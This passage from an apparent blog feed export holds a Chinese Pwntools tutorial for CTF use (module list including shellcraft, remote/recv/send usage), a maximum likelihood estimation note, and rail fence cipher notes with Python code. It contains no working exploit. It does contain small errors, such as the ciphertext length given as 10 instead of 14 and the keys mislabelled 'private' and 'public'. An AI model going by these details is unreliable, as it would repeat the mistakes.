<tr class="odd">
<td><code>pwnlib.shellcraft.amd64</code></td>
<td>Shellcode for AMD64</td>
</tr>
<tr class="even">
<td><code>pwnlib.shellcraft.arm</code></td>
<td>Shellcode for ARM</td>
</tr>
<tr class="odd">
<td><code>pwnlib.shellcraft.common</code></td>
<td>Shellcode 所有架构的基本利用</td>
</tr>
<tr class="even">
<td><code>pwnlib.shellcraft.i386</code></td>
<td>Shellcode for Intel 80386</td>
</tr>
<tr class="odd">
<td><code>pwnlib.shellcraft.mips</code></td>
<td>Shellcode for MIPS</td>
</tr>
<tr class="even">
<td><code>pwnlib.shellcraft.thumb</code></td>
<td>Shellcode for Thumb Mode</td>
</tr>
<tr class="odd">
<td><code>pwnlib.term</code></td>
<td>终端处理封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.timeout</code></td>
<td>超时处理封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.tubes</code></td>
<td>套接字、SSH 等 IO 封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.tubes.buffer</code></td>
<td>IO 缓冲封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.tubes.process</code></td>
<td>IO 进程封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.tubes.serialtube</code></td>
<td>IO 串行端口封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.tubes.sock</code></td>
<td>套接字封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.tubes.ssh</code></td>
<td>SSH 封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.ui</code></td>
<td>UI 封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.update</code></td>
<td>更新 Pwntools</td>
</tr>
<tr class="odd">
<td><code>pwnlib.useragents</code></td>
<td>useragent 生成封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.util.crc</code></td>
<td>计算一系列 CRC 的封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.util.cyclic</code></td>
<td>一些序列生成器的封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.util.fiddling</code></td>
<td>编码封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.util.getdents</code></td>
<td>Linux 二进制目录处理</td>
</tr>
<tr class="even">
<td><code>pwnlib.util.hashes</code></td>
<td>哈希散列函数封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.util.iters</code></td>
<td>itertools 的扩展</td>
</tr>
<tr class="even">
<td><code>pwnlib.util.lists</code></td>
<td>对 list 的操作封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.util.misc</code></td>
<td>一些没办法分类的杂项函数封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.util.net</code></td>
<td>网络交互封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.util.packing</code></td>
<td>压缩操作封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.util.proc</code></td>
<td>与 <code>/proc/</code> 相关的进程操作封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.util.safeeval</code></td>
<td>安全的 <code>eval()</code></td>
</tr>
<tr class="even">
<td><code>pwnlib.util.sh_string</code></td>
<td>Shell 字符串 <code>eval()</code></td>
</tr>
<tr class="odd">
<td><code>pwnlib.util.web</code></td>
<td>web 网络交互工具</td>
</tr>
</tbody>
</table>
<blockquote>
<p>推荐使用 <code>from pwn import *</code> 将以上各功能模块直接导入</p>
</blockquote>
<h1 id="pwntools-与服务器">Pwntools 与服务器</h1>
<p>使用 Pwntools 与服务器进行交互，需要利用 <code>pwnlib.tubes</code>
库，方便起见可以直接 <code>from pwn import *</code> 导入所有模块。</p>
<h2 id="建立连接">建立连接</h2>
<p>建立连接我们需要使用 <code>remote</code> 类，它的构造函数需要接收域名
(host) 和 端口 (port) 来跟服务器建立 TCP 或 UDP 连接，相当于 Linux 中的
<code>nc</code> 指令。</p>
<p>其他参数请参考官方文档 <a href="http://docs.pwntools.com/en/latest/tubes.html">http://docs.pwntools.com/en/latest/tubes.html</a></p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io = pwn.remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">client = pwn.remote(<span class="string">&quot;Localhost&quot;</span>, <span class="number">8888</span>)</span><br></pre></td></tr></table></figure>
<h2 id="接收数据">接收数据</h2>
<ul>
<li><p><code>recv(numb, timeout)</code></p>
<p><code>numb</code> → 接收的字节数；有默认值</p>
<p><code>timeout</code> → 接收时限，单位秒，超时则中断接收；有默认值</p>
<p><code>@returns</code> → 返回一个保存所接收数据的 <code>bytes</code>
数组</p>
<p>如果不给参数，默认返回缓冲区数据</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接收所有数据 (但只是缓冲区内容)</span></span><br><span class="line">data = io.recv()</span><br><span class="line"><span class="comment"># 接收 1024 字节数据</span></span><br><span class="line">data = io.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># 接收 1 秒数据</span></span><br><span class="line">data = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 接收 1024 字节数据，如果超时则直接返回</span></span><br><span class="line">data = io.recv(<span class="number">1024</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
<li><p><code>recvall(timeout)</code></p>
<p><code>timeout</code> → 接收时限，单位秒，超时则中断接收；默认
forever</p>
<p><code>@returns</code> → 返回一个保存所接收数据的 <code>bytes</code>
数组</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接收所有数据，直到 socket 关闭</span></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="comment"># 接收 1 秒数据</span></span><br><span class="line">data = io.recvall(timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
<li><p><code>recvline(keepends, timeout)</code></p>
<p><code>keepends</code> → 接收数据是否保留回车；默认保留</p>
<p><code>timeout</code> → 接收时限，单位秒，超时则中断接收；有默认值</p>
<p><code>@returns</code> → 返回一个保存所接收数据的 <code>bytes</code>
数组</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接收一行数据 (但含有&#x27;\n&#x27;)</span></span><br><span class="line">data = io.recvline()</span><br><span class="line"><span class="comment"># 接收一行数据 (不含有&#x27;\n&#x27;)</span></span><br><span class="line">data = io.recvline(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
<li><p><code>recvuntil(delims, drop, timeout)</code></p>
<p><code>delims</code> → 接收中止标志</p>
<p><code>drop</code> → 是否丢弃中止标志；默认不丢弃</p>
<p><code>timeout</code> → 接收时限，单位秒，超时则中断接收；有默认值</p>
<p><code>@returns</code> → 返回一个保存所接收数据的 <code>bytes</code>
数组</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">接收数据直到接收到 &#x27;start&#x27; 后结束，字符串中包含 &#x27;start&#x27;</span></span><br><span class="line"><span class="string">比如缓冲区中存在数据 &#x27;the game is started!&#x27;</span></span><br><span class="line"><span class="string">那么函数会返回 b&#x27;the game is start&#x27;，缓冲区为 &#x27;ed!&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">data = io.recvuntil(<span class="string">&#x27;start&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">接收数据直到接收到 &#x27;start&#x27; 后结束，字符串中不包含 &#x27;start&#x27;</span></span><br><span class="line"><span class="string">比如缓冲区中存在数据 &#x27;the game is started!&#x27;</span></span><br><span class="line"><span class="string">那么函数会返回 b&#x27;the game is &#x27;，而缓冲区为 &#x27;ed!&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">data = io.recvuntil(<span class="string">&#x27;start&#x27;</span>, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="发送数据">发送数据</h2>
<ul>
<li><p><code>send(data)</code></p>
<p><code>data</code> → 发送的 bytes 数组</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发送数据，但不包含&#x27;\n&#x27;</span></span><br><span class="line">io.send(<span class="string">&#x27;hey!&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p><code>sendline(data)</code></p>
<p><code>data</code> → 发送的 bytes 数组，默认值为换行符</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发送数据，且包含换行符</span></span><br><span class="line">io.sendline(<span class="string">&#x27;hey!&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p><code>sendthen(delim, data, timeout)</code></p>
<p><code>delims</code> → 接收中止标志</p>
<p><code>data</code> → 发送的 bytes 数组</p>
<p><code>timeout</code> → 接收时限，单位秒，超时则中断接收；有默认值</p>
<p><code>@returns</code> → 返回一个保存所接收数据的 <code>bytes</code>
数组</p>
<p><code>sendlinethen</code> 同理</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发送数据&#x27;hey!&#x27;，然后 io.recvuntil(&#x27;how are u?&#x27;)</span></span><br><span class="line">data = io.sendthen(<span class="string">&#x27;how are u?&#x27;</span>, <span class="string">&#x27;hey!&#x27;</span>)</span><br><span class="line"><span class="comment"># 发送数据&#x27;hey!&#x27;，然后 io.recvuntil(&#x27;how are u?&#x27;, 1)</span></span><br><span class="line">data = io.sendthen(<span class="string">&#x27;how are u?&#x27;</span>, <span class="string">&#x27;hey!&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
<li><p><code>sendafter(delim, data, timeout)</code></p>
<p><code>delims</code> → 接收中止标志</p>
<p><code>data</code> → 发送的 bytes 数组</p>
<p><code>timeout</code> → 接收时限，单位秒，超时则中断接收；有默认值</p>
<p><code>@returns</code> → 返回一个保存所接收数据的 <code>bytes</code>
数组</p>
<p><code>sendlinethen</code> 同理</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># io.recvuntil(&#x27;how are u?&#x27;)，然后接收数据&#x27;I am fine.&#x27;</span></span><br><span class="line">data = io.sendafter(<span class="string">&#x27;how are u?&#x27;</span>, <span class="string">&#x27;I am fine.&#x27;</span>)</span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;how are u?&#x27;, 1)，然后接收数据&#x27;I am fine.&#x27;</span></span><br><span class="line">data = io.sendafter(<span class="string">&#x27;how are u?&#x27;</span>, <span class="string">&#x27;hey!&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="交互模式">交互模式</h2>
<p><code>remote.interactive()</code></p>
<p>可以直接进入终端交互模式，自动接收数据并输出，且会等待输入。</p>
<p>使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="完整示例">完整示例</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 与 127.0.0.1:8888 建立tcp连接</span></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="comment"># 接收一行数据(例如 b&#x27;how are u?\n&#x27;)并解码为str类型</span></span><br><span class="line">msg = io.recvline().decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;recv: <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送一行数据(即发送 b&#x27;I am fine. are u?\n&#x27;)</span></span><br><span class="line">io.sendline(<span class="string">&quot;I am fine. are u?&quot;</span>.encode())</span><br><span class="line"><span class="comment"># 接收一行数据(例如 b&#x27;I am fine, too.\n&#x27;)并解码为str类型</span></span><br><span class="line">msg = io.recvline().decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;recv: <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当接收的数据不是 &quot;goobye!&quot; 的时候循环</span></span><br><span class="line"><span class="keyword">while</span> msg != <span class="string">&quot;goodbye!&quot;</span>:</span><br><span class="line">    <span class="comment"># 发送一行数据(即发送 b&#x27;baka!\n&#x27;)</span></span><br><span class="line">    io.sendline(<span class="string">&quot;baka!&quot;</span>.encode())</span><br><span class="line">    <span class="comment"># 接收一行数据(例如 b&#x27;???\n&#x27;)并解码为str类型</span></span><br><span class="line">    msg = io.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;recv: <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结束连接</span></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>模式识别-参数估计笔记</title>
    <url>//parameter-estimate.html</url>
    <content><![CDATA[<h1 id="模式识别">模式识别</h1>
<h2 id="前言">前言</h2>
<p>先验概率是可以通过训练集和先验知识易求得的，但类条件概率密度是难求的，主要的问题有两个：</p>
<ol type="1">
<li>很多情况下，已有的训练样本数总是显得太少；</li>
<li>用于表示特征的向量 <span class="math inline">\(\boldsymbol{x}\)</span>
的维数过大时，计算负担更大。</li>
</ol>
<p>这时候我们一般会像上一章所说的那样，譬如让 <span class="math inline">\(p(\boldsymbol{x}|\omega_j)\sim
N(\boldsymbol{\mu}|\Sigma)\)</span>，即假设我们求类条件概率密度转化为求<strong>正态分布的参数</strong>，这种方式称作<strong>参数化</strong>，即使得类条件概率密度仅依赖于某些参数（例如在这里是均值和协方差矩阵）。</p>
<p>也可以让类条件概率密度<strong>参数化</strong>为其他分布密度（例如泊松分布），但此时的问题就转化为——估计（计算）参数。</p>
<p>而估计（计算）这些参数，主要有两种方式——最大似然估计和贝叶斯参数估计。</p>
<h2 id="最大似然估计">最大似然估计</h2>
<h3 id="基本原理">基本原理</h3>
<p>假设我们有 <span class="math inline">\(c\)</span> 个样本集，<span class="math inline">\(D_1,D_2,\cdots,D_c\)</span>，而任意一个样本集所得到的类条件概率密度
<span class="math inline">\(p(\boldsymbol{x}|\omega_j)\)</span>
是互相独立的。在前言中，我们目前的问题是，知道 <span class="math inline">\(p(\boldsymbol{x}|\omega_j)\)</span>
的形式，但未知其参数，最大似然估计中，将参数写作 <span class="math inline">\(\boldsymbol{\theta}\)</span>
的形式，每个参数值记作 <span class="math inline">\(\theta_1,\theta_2,\cdots,\theta_p\)</span>（参数向量的维度与特征向量的维度不统一），通常可以写作
<span class="math inline">\(p(\boldsymbol{x}|\omega_j,\boldsymbol{\theta_j})\)</span>，这表示对于某一类条件概率密度的参数向量函数。</p>
<blockquote>
<p>例如已知 <span class="math inline">\(p(x|\omega_j)\sim
N(\mu,\sigma^2)\)</span>，即一个一维特征类条件概率密度满足正态分布的形式，那么我们求解类条件概率密度问题就转化为求解正态分布的参数
<span class="math inline">\((\mu,\sigma^2)\)</span>。</p>
<p>那么我们把参数向量写作 <span class="math inline">\(\boldsymbol{\theta}_j=(\mu,\sigma^2)^T\)</span>，即对于
<span class="math inline">\(\omega_j\)</span>
的类条件概率密度的参数向量，写作 <span class="math inline">\(p(x|\omega_j,\boldsymbol{\theta_j})\)</span>，此时特征向量维度为
1，参数向量维度为 2。</p>
</blockquote>
<p>为简化问题，设样本集 <span class="math inline">\(D\)</span> 中有
<span class="math inline">\(n\)</span> 个样本 <span class="math inline">\(\boldsymbol{x}_1,\boldsymbol{x}_2,\cdots,\boldsymbol{x}_n\)</span>，把上式写作
<span class="math inline">\(p(D|\boldsymbol{\theta})\)</span>，仅研究对于某个样本集的参数向量的计算，满足
<span class="math display">\[
p(D|\boldsymbol{\theta})=\prod^n_{k=1}p(\boldsymbol{x}_k|\boldsymbol{\theta})
\]</span></p>
<blockquote>
<p>采用<strong>属性条件独立性假设</strong>，各个分布独立，其联合分布即各个分布的乘积。</p>
</blockquote>
<p>由于 <span class="math inline">\(D\)</span> 是已知的，故实际上 <span class="math inline">\(p(D|\boldsymbol{\theta})\)</span> 是一个关于 <span class="math inline">\(\boldsymbol{\theta}\)</span>
的<strong>似然函数</strong>。</p>
<figure>
<img src="/parameter-estimate/最大似然估计图示.png" alt="最大似然估计图示">
<figcaption aria-hidden="true">最大似然估计图示</figcaption>
</figure>
<p>定义，梯度算子 <span class="math display">\[
\nabla_{\boldsymbol{\theta}}=\left[\begin{array}{c}
\frac{\partial}{\partial \theta_{1}} \\
\vdots \\
\frac{\partial}{\partial \theta_{p}}
\end{array}\right]
\]</span> 定义对数似然函数 <span class="math display">\[
\begin{align}
l(\boldsymbol{\theta})
&amp;=\ln{p(D|\boldsymbol{\theta})}\\
&amp;=\sum^n_{k=1}\ln{p(\boldsymbol{x}_k|\boldsymbol{\theta})}
\end{align}
\]</span></p>
<blockquote>
<p>这里主要是将乘积转化为求和，可以更好的运算。</p>
</blockquote>
<p>那么，记 <span class="math display">\[
\hat{\boldsymbol{\theta}}=\arg{\max_{\boldsymbol{\theta}}{l(\boldsymbol{\theta})}}
\]</span> 且 <span class="math display">\[
\nabla_{\boldsymbol{\theta}}l=\sum^n_{k=1}\nabla_{\boldsymbol{\theta}}\sum^n_{k=1}\ln{p(\boldsymbol{x}_k|\boldsymbol{\theta})}
\]</span> 我们得到最大似然估计值 <span class="math inline">\(\boldsymbol{\theta}\)</span> 的必然条件为 <span class="math display">\[
\nabla_{\boldsymbol{\theta}}l=0
\]</span></p>
<blockquote>
<p>根据此条件得到的 <span class="math inline">\(\hat{\boldsymbol{\theta}}\)</span>
可能是局部极大值，或是拐点，需要讨论。类似于函数讨论最大值点。</p>
</blockquote>
<p>理论上来说，如果训练样本个数越多，其中的样本就越具有代表性，参数值也就越接近真实值。</p>
<h3 id="正态分布boldsymbolmu-未知">正态分布：<span class="math inline">\(\boldsymbol{\mu}\)</span> 未知</h3>
<p>根据上一篇文章，可以知道多维正态分布的对数似然函数为 <span class="math display">\[
l(\boldsymbol{\mu})=-\frac{d}{2}\ln{2\pi}-\frac{1}{2}\ln{|\Sigma_i|}-\frac{1}{2}(\boldsymbol{x}-\boldsymbol{\mu}_i)^T\Sigma^{-1}_i(\boldsymbol{x}-\boldsymbol{\mu}_i)
\]</span></p>
<blockquote>
<p>在这里 <span class="math inline">\(\boldsymbol{\theta}=\boldsymbol{\mu}\)</span>。</p>
</blockquote>
<p>求得 <span class="math display">\[
\nabla_\boldsymbol{\mu}l=\Sigma^{-1}(\boldsymbol{x}_k-\boldsymbol{\mu})
\]</span> 令 <span class="math display">\[
\nabla_\boldsymbol{\mu}l=0
\]</span> 求得 <span class="math display">\[
\hat{\boldsymbol{\mu}}=\frac{1}{n}\sum^n_{k=1}\boldsymbol{x}_k
\]</span> 显然最大似然估计的结果满足我们直觉所得。</p>
<h3 id="正态分布musigma2-未知">正态分布：<span class="math inline">\((\mu,\sigma^2)\)</span> 未知</h3>
<p>根据上一篇文章，可以知道一维正态分布的对数似然函数为 <span class="math display">\[
l(\boldsymbol{\theta})=-\frac{1}{2}\ln{(2\pi\theta_2)}-\frac{1}{2\theta_2}(x_k-\theta_1)
\]</span></p>
<blockquote>
<p>在这里 <span class="math inline">\(\boldsymbol{\theta}=(\mu,\sigma^2)^T\)</span>。</p>
</blockquote>
<p>求梯度可得 <span class="math display">\[
\boldsymbol{\nabla}_{\theta}
\mid=\boldsymbol{\nabla}_{\boldsymbol{\theta}} \ln p\left(x_{k} \mid
\boldsymbol{\theta}\right)=\left[\begin{array}{c}
\frac{1}{\theta_{2}}\left(x_{k}-\theta_{1}\right) \\
-\frac{1}{2 \theta_{2}}+\frac{\left(x_{k}-\theta_{1}\right)^{2}}{2
\theta_{2}^{2}}
\end{array}\right]
\]</span> 易得 <span class="math display">\[
\hat{\mu}=\frac{1}{n}\sum^n_{k=1}x_k\\
\hat{\sigma^2}=\frac{1}{n}\sum^n_{k=1}(x_k-\hat{\mu})^2
\]</span> 对于多元正态分布，我们也可以求得满足直觉的结果。</p>
<h3 id="估计的偏差">估计的偏差</h3>
]]></content>
      <tags>
        <tag>模式识别</tag>
      </tags>
  </entry>
  <entry>
    <title>栅栏密码笔记</title>
    <url>//rail-fence-cipher-note.html</url>
    <content><![CDATA[<h1 id="普通栅栏算法">普通栅栏算法</h1>
<h2 id="加密算法描述">加密算法描述</h2>
<ol type="1">
<li><p>现有明文 <code>Thi5_1s_a_fl4g</code>，对其进行两两分组得到：</p>
<p><code>Th</code>、<code>i5</code>、<code>_1</code>、<code>s_</code>、<code>a_</code>、<code>fl</code>、<code>4g</code></p></li>
<li><p>然后取每组的第 1 个字符连成第一段，每组的第 2
个字符连成第二段，最后得到：</p>
<p><code>Ti_saf4</code>、<code>h51__lg</code></p></li>
<li><p>将以上多段组合起来，得到密文：</p>
<p><code>Ti_saf4h51__lg</code></p></li>
</ol>
<p>从以上可以看出，普通栅栏算法当明文过于简单、分组个数较小和加密轮数低时，容易被直接破解。</p>
<h2 id="解密算法描述">解密算法描述</h2>
<ol type="1">
<li><p>现有密文
<code>Ti_saf4h51__lg</code>，已知加密时是两两分组，我们便将其分为两段
(或者理解为密文长度为 10，加密用的是因数 2 进行分组，则解密使用因数 5
进行分组)：</p>
<p><code>Ti_saf4</code>、<code>h51__lg</code></p></li>
<li><p>然后取每组的第 1 个字符连成第一段，每组的第 2
个字符连成第二段，最后得到：</p>
<p><code>Th</code>、<code>i5</code>、<code>_1</code>、<code>s_</code>、<code>a_</code>、<code>fl</code>、<code>4g</code></p></li>
<li><p>将以上多段组合起来，得到明文：</p>
<p><code>Thi5_1s_a_fl4g</code></p></li>
</ol>
<p>从以上可以看出，普通栅栏算法可以采用同一个函数进行加解密，只是投入的密钥不相同。</p>
<h2 id="算法定义">算法定义</h2>
<p>通过以上算法描述，我们可以做出以下简单定义：</p>
<blockquote>
<p>将明文分成 <span class="math inline">\(k\)</span> 组，取每一组的第
<span class="math inline">\(n\)</span>
个字符连成一段，最后再将各段连接得到密文。</p>
</blockquote>
<p>同时可知栅栏密码本质上是一个换位密码，并不改变明文信息，只改变明文顺序，理论上复杂度只取决于<strong>明文字长</strong>、<strong>分组个数</strong>和<strong>加密轮数</strong>。</p>
<p>栅栏算法可以如下定义，其中<span class="math inline">\(m\)</span>为明文，<span class="math inline">\(c\)</span>为密文，<span class="math inline">\(length\)</span>为明文（密文）长度，<span class="math inline">\(F(x,y)\)</span>为普通栅栏算法： <span class="math display">\[
length=pq(p,q\in\Z)\\
c=F(m,p)\\
m=F(c,q)
\]</span> 以上我们可以称<span class="math inline">\(p\)</span>为私钥
(private key)，而<span class="math inline">\(q\)</span>为公钥 (public
key)</p>
<h2 id="算法实现">算法实现</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">railfence</span>(<span class="params">data:<span class="built_in">str</span>, key:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(data[i::key] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key))</span><br></pre></td></tr></table></figure>
<p>其中我们也可以实现对密文进行爆破的算法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">railfence</span>(<span class="params">data:<span class="built_in">str</span>, key:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(data[i::key] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 x 的所有因数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">x:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, math.floor(math.sqrt(x))+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> x % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">yield</span> i</span><br><span class="line">            <span class="keyword">yield</span> x // i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">data:<span class="built_in">str</span>, needkeys:<span class="built_in">bool</span>=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> needkeys:</span><br><span class="line">        facs = [i <span class="keyword">for</span> i <span class="keyword">in</span> factor(<span class="built_in">len</span>(data))]</span><br><span class="line">        <span class="keyword">return</span> facs, [railfence(data, i) <span class="keyword">for</span> i <span class="keyword">in</span> facs]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [railfence(data, i) <span class="keyword">for</span> i <span class="keyword">in</span> factor(<span class="built_in">len</span>(data))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_crack</span>(<span class="params">data:<span class="built_in">str</span></span>):</span><br><span class="line">    keys, msg = crack(data, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> k, m <span class="keyword">in</span> <span class="built_in">zip</span>(keys, msg):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>栏: <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">print_crack(<span class="string">&quot;Ti_saf4h51__lg&quot;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="密钥栅栏算法">密钥栅栏算法</h1>
<h2 id="加密算法描述-1">加密算法描述</h2>
<ol type="1">
<li><p>现有明文
<code>Thi5_1s_a_fl4g</code>，对其每七个为一组分组得到：</p>
<p><code>Thi5_1s</code>、<code>_a_fl4g</code></p></li>
<li><p>然后取每组的第 1 个字符连成第一段，每组的第 2
个字符连成第二段，最后得到：</p>
<p><code>T_</code>、<code>ha</code>、<code>i_</code>、<code>5f</code>、<code>_l</code>、<code>14</code>、<code>sg</code></p></li>
<li><p>密钥即是组合顺序，现有密钥
<code>3127645</code>，则组合的密文为：</p>
<p><code>i_T_hasg145f_l</code></p></li>
</ol>
<p>可以看出，相比起普通栅栏算法，更难看出明文原本的顺序，但始终受制于<strong>明文字长</strong>、<strong>分组个数</strong>和<strong>加密轮数</strong>，与密钥复杂度不呈现相关性。</p>
<h2 id="解密算法描述-1">解密算法描述</h2>
<ol type="1">
<li><p>现有密文 <code>i_T_hasg145f_l</code>，按照密钥
<code>3127645</code> 还原各段：</p>
<p><code>T_</code>、<code>ha</code>、<code>i_</code>、<code>5f</code>、<code>_l</code>、<code>14</code>、<code>sg</code></p></li>
<li><p>然后取每段的第 1 个字符连成第一组，每段的第 2
个字符连成第二组，最后得到：</p>
<p><code>Thi5_1s</code>、<code>_a_fl4g</code></p></li>
<li><p>将以上多段组合起来，得到明文：</p>
<p><code>Thi5_1s_a_fl4g</code></p></li>
</ol>
<p>可以看出，相比起普通栅栏算法，还原明文时受制于密钥，如果不掌握密钥恢复的可能性将大大降低。</p>
<h2 id="算法实现-1">算法实现</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">railfence_plus_encode</span>(<span class="params">data:<span class="built_in">str</span>, key:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([data[i::<span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key))][i-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> key)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">railfence_plus_decode</span>(<span class="params">data:<span class="built_in">str</span>, key:<span class="built_in">list</span></span>):</span><br><span class="line">    k = <span class="built_in">len</span>(data)//<span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([data[key.index(i+<span class="number">1</span>)*k + j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key))])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(railfence_plus_encode(<span class="string">&quot;Thi5_1s_a_fl4g&quot;</span>, [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">5</span>]))</span><br><span class="line"><span class="built_in">print</span>(railfence_plus_decode(<span class="string">&quot;i_T_hasg145f_l&quot;</span>, [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">5</span>]))</span><br></pre></td></tr></table></figure>
<p>理论上，我们可以对密文进行爆破，仅需得到密钥的全排列即可 (可以使用
<code>itertools.permutations</code>)</p>
<h1 id="w型栅栏算法">W型栅栏算法</h1>
<h2 id="算法描述">算法描述</h2>
<p>将明文按w型排列，然后将每一行的字母依次连起来组成密文，行数就是密钥。</p>
<p>解密则同样画出这个w型图案，将每一列的字母依次连接起来组成明文。</p>
<p>W型栅栏密码的密钥不只是密文长度的因数，任何小于密文长度大于1的整数都有可能。</p>
<h2 id="算法实现-2">算法实现</h2>
